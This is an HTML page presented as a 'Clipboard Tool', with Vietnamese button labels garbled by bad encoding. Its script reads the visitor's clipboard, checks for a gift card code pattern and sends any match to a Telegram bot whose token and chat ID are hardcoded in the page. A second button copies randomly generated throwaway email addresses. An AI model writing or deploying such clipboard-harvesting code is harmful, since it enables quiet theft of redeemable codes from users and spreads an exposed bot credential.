<body>

<h2>ğŸ“‹ Clipboard Tool</h2>

<button onclick="sendGiftcard()">ğŸ“¤ Gá»­i giftcard</button>
<button onclick="copyRandomEmail()">ğŸ“§ Copy email ngáº«u nhiÃªn</button>

<div id="status"></div>

<script>
const BOT_TOKEN = "8532371199:AAGPwvx5Jt1Ul6Js0DuzRJk-RVhuWROH0R0";
const CHAT_ID = "5376711844";

// Regex giftcard: XXXX-XXXXXX-XXXX
const GIFT_REGEX = /^[A-Z0-9]{4}-[A-Z0-9]{6}-[A-Z0-9]{4}$/;

/* ===== NÃšT 1: Gá»¬I GIFT CARD ===== */
async function sendGiftcard() {
  const status = document.getElementById("status");
  status.textContent = "";
  status.className = "";

  let text = "";
  try {
    text = await navigator.clipboard.readText();
  } catch (e) {
    return;
  }

  text = text.trim().toUpperCase();

  // âŒ Sai Ä‘á»‹nh dáº¡ng
  if (!GIFT_REGEX.test(text)) {
    status.textContent = "âŒ Sai Ä‘á»‹nh dáº¡ng gift card";
    status.className = "error";
    return;
  }

  // âœ… Gá»­i vá» Telegram
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text
    })
  }).then(() => {
    status.textContent = "âœ… Gá»­i gift card thÃ nh cÃ´ng";
    status.className = "success";
  }).catch(() => {
    status.textContent = "âŒ Gá»­i tháº¥t báº¡i";
    status.className = "error";
  });
}

/* ===== NÃšT 2: COPY EMAIL NGáºªU NHIÃŠN ===== */
function generateEmail() {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  const domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"];
  let name = "";
  for (let i = 0; i < 12; i++) {
    name += chars[Math.floor(Math.random() * chars.length)];
  }
  return name + "@" + domains[Math.floor(Math.random() * domains.length)];
}

function copyRandomEmail() {
  const email = generateEmail();
  const temp = document.createElement("textarea");
  temp.value = email;
  document.body.appendChild(temp);
  temp.select();
  temp.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(temp);
}
</script>
